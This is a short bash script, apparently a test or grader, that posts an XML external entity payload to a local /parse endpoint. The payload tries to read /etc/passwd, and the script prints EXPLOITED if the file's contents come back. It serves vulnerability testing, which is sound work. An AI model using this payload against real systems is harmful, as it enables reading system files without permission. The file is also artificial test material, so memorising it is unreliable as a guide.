#!/usr/bin/env bash
BASE="http://127.0.0.1:${PORT:-5000}"
PAYLOAD='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
resp=$(curl -s -X POST "$BASE/parse" -H "Content-Type: application/xml" -d "$PAYLOAD")
if echo "$resp" | grep -q "root:"; then echo "EXPLOITED"; exit 0
else echo "NOT_EXPLOITED"; exit 1; fi
